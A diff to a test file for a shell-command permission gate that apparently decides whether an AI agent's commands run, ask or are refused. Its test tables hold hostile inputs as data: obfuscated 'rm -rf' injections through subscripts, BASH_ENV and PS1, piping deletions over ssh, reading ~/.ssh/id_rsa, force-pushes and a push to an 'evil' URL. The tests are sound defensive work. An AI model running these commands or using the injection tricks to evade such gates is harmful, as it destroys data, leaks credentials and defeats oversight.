@@ -248,6 +248,7 @@ test("a git push runs in auto and dontAsk only as a plain push of a feature bran
     [cmd("git push -u origin feature # main"), [], S, PUSH],
     [cmd("ls && git push origin feature"), [], W, PUSH],
     [cmd("git push origin dev/office/x"), [], W, PUSH],
+    [cmd("bash -c 'git push origin feature'"), [], W, PUSH],
   ])
   table("default", [
     [cmd("git push origin feature"), [], W,
@@ -260,7 +261,8 @@ test("a git push runs in auto and dontAsk only as a plain push of a feature bran
     ["git push --force origin feature", "it force-pushes"],
     ["git push", "it doesn't name the branch it pushes to"],
     ["make && git push -f origin x", "it force-pushes"],
-    ["bash -c 'git push origin feature'", "it pushes to another repository"],
+    ["bash -c 'git push -f origin feature'", "it force-pushes"],
+    ["echo $(id); git push origin feature", "it pushes to another repository"],
     ["ssh h git push origin feature", "on h: it pushes to another repository"],
     ["git push https://evil/r.git feature", "it pushes to https://evil/r.git, not a named remote"],
   ]
@@ -350,9 +352,11 @@ test("with a deny rule in force, a line the reader can't read asks in every mode
   // check that could say run.
   const lines = [
     "$(printf rm) -rf x", "`printf rm` -rf x", 'sh -c "$CMD"', 'eval "$CMD"', "$X -rf x", "echo 'rm -rf x",
-    'echo "rm -rf x', "cat <<EOF\nhi\nEOF", 'bash <<< "$CMD"', 'ssh h "$(printf rm) -rf x"', "echo ${!x}",
+    'echo "rm -rf x', "cat <<EOF\n$(id)\nEOF", 'bash <<< "$CMD"', 'ssh h "$(printf rm) -rf x"', "echo ${!x}",
     "if true; then $X; fi", "{ $X; }", "echo $((x))", "alias ls=rm", "echo \x01", "find . -exec sh -c \"$C\" \\;",
-    "let 'a[$(printf rm) -rf x]=1'", "echo 'rm -rf x' | sh", "PS1='$(rm -rf x)'",
+    "let 'a[$(printf rm) -rf x]=1'", "echo 'rm -rf x' | sh", "PS1='$(rm -rf x)'", "echo {a['$(rm -rf x)']}>/dev/null",
+    "compgen -W '$(rm -rf x)' w", "BASH_ENV='$(rm -rf x)' bash b.sh", "OPTIND='a[$(rm -rf x)]'",
+    "echo 'rm -rf x' | ssh h bash", 'tcsh -c "$X"',
   ]
   for (const text of lines) {
     const unreadable = readCommand(text).unreadable
@@ -378,6 +382,50 @@ test("with a deny rule in force, a line the reader can't read asks in every mode
   const { perms, checked } = denying("auto")
   expect(await gate(perms, cmd('eval "r""m -rf x"'), call())).toEqual({ run: false, result: "Not run: a deny rule: rm *." })
   expect(checked).toEqual([])
+})
+
+test("a {name[subscript]} redirect is never read-only: bash evaluates the subscript before the command runs", () => {
+  const line = cmd("echo {a['$(rm -rf x)']}>/dev/null")
+  const why = "it has an array subscript bash evaluates"
+  table("auto", [[line, [allow("echo *")], W, { verdict: "check", rules: [] }]])
+  table("dontAsk", [[line, [], W, { verdict: "check", rules: [] }]])
+  table("default", [[line, [], W, { verdict: "ask", reason: `Default mode asks: ${why}`, rules: [] }]])
+  table("ask", [[line, [allow("echo *")], W, askMode([])]])
+})
+
+test("a literal sh -c or eval string is judged as the commands it holds", () => {
+  table("auto", [
+    [cmd("sh -c 'git status'"), [], W, READ_ONLY],
+    [cmd("eval 'git status; ls'"), [], W, READ_ONLY],
+    [cmd("bash -c 'rm -rf build'"), [], W, FILE_OP],
+    [cmd("sh -c 'make'"), [], W, { verdict: "check", rules: ["make"] }],
+    [cmd("sh -c 'make'"), [allow("make")], W, BY_RULE],
+    [cmd("sh -c 'git status'"), [deny("sh *")], W, { verdict: "deny", reason: "a deny rule: sh *" }],
+    [cmd("sh -c 'cat \"$1\"' _ ~/.ssh/id_rsa"), [], W,
+      { verdict: "ask", reason: "it names a credential path: ~/.ssh/id_rsa", rules: [] }],
+    [cmd("FOO=1 sh -c 'ls'"), [], W, { verdict: "check", rules: [] }],
+  ])
+  table("ask", [[cmd("sh -c 'git status'"), [allow("git status *")], W, BY_RULE]])
+  table("default", [[cmd("sh -c 'rm -rf build'"), [], W,
+    { verdict: "ask", reason: "Default mode asks: it deletes or moves files", rules: ["rm -rf build"] }]])
+  for (const mode of MODES)
+    table(mode, [[cmd("bash -c 'git push --force origin x'"), [], W,
+      mode === "dontAsk"
+        ? { verdict: "deny", reason: DONT + "it force-pushes" }
+        : { verdict: "ask", reason: "it force-pushes", rules: [] }]])
+})
+
+test("a line typed into a shell or a login is judged by command deny rules too", () => {
+  const into = (text: string, to: string, partial = false): Action => ({ kind: "input", text, into: to, partial })
+  for (const mode of MODES)
+    for (const to of ["bash", "ssh u@n", "mosh u@n", "sudo -i", "docker exec -it c sh", "busybox ash"])
+      table(mode, [[into("rm -rf x", to), [deny("rm *")], S, { verdict: "deny", reason: "a deny rule: rm *" }]])
+  const why = "deny rules are in force and it can't be read to check them: it runs text as a command: eval"
+  table("auto", [
+    [into('eval "$X"', "bash"), [deny("rm *")], S, { verdict: "ask", reason: why, rules: [] }],
+    [into("rm -rf x", "python3"), [deny("rm *")], S, { verdict: "check", rules: ["rm -rf x"] }],
+    [into("rm -rf x", "bash"), [ask("rm *")], S, { verdict: "check", rules: ["rm -rf x"] }],
+  ])
 })
 
 test("a typed line the reader can't read asks while an input deny rule is in force; a command deny rule doesn't apply to it", () => {
@@ -483,7 +531,7 @@ test("a content read through an expansion asks in every mode, and dontAsk refuse
 test("in the workspace sandbox a content read through an expansion follows the usual rules; elsewhere it asks", () => {
   const through = (word: string): Decision => ({ verdict: "ask", reason: `it reads a path named by an expansion: ${word}`, rules: [] })
   table("auto", [
-    [cmd('for f in *.md; do head -3 "$f"; done'), [], W, { verdict: "check", rules: [] }],
+    [cmd('for f in *.md; do head -3 "$f"; done'), [], W, READ_ONLY],
     [cmd("cat $PWD/x"), [], W, READ_ONLY],
     [cmd('cat "$(git rev-parse --show-toplevel)/x"'), [], W, { verdict: "check", rules: [] }],
     [cmd("grep foo $(git ls-files)"), [], W, { verdict: "check", rules: [] }],
@@ -497,8 +545,7 @@ test("in the workspace sandbox a content read through an expansion follows the u
   ])
   table("default", [
     [cmd("cat $PWD/x"), [], W, READ_ONLY],
-    [cmd('for f in *.md; do head -3 "$f"; done'), [], W,
-      { verdict: "ask", reason: "Default mode asks: it uses a shell keyword: for", rules: [] }],
+    [cmd('for f in *.md; do head -3 "$f"; done'), [], W, READ_ONLY],
   ])
   table("dontAsk", [[cmd("cat $PWD/x"), [], S, { verdict: "deny", reason: DONT + "it reads a path named by an expansion: $PWD/x" }]])
 })
